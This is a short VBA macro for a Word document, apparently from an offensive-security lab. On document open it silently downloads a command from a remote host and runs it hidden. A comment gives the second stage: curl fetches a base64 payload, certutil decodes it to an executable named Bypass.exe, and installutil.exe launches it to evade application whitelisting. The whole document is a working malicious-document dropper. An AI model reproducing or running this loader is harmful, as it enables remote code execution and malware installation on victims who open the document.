Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Set o = CreateObject("MSXML2.XMLHTTP")
    o.Open "GET", "http://192.168.0.197/a.txt", False
    o.send
    Dim stt As String
    stt = o.responseText
    Set WshShell = CreateObject("WScript.Shell")
    WshShell.Run (stt), 0
    Set WshShell = Nothing
    
End Sub



'a.txt contains:
' cmd /c curl -o C:\Users\Public\Documents\enc.txt http://192.168.0.197/file.txt && certutil -decode C:\Users\Public\Documents\enc.txt C:\Users\Public\Documents\Bypass.exe && del C:\Users\Public\Documents\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Users\Public\Documents\Bypass.exe
' file.txt is base64 encoded compiled installutil exe 

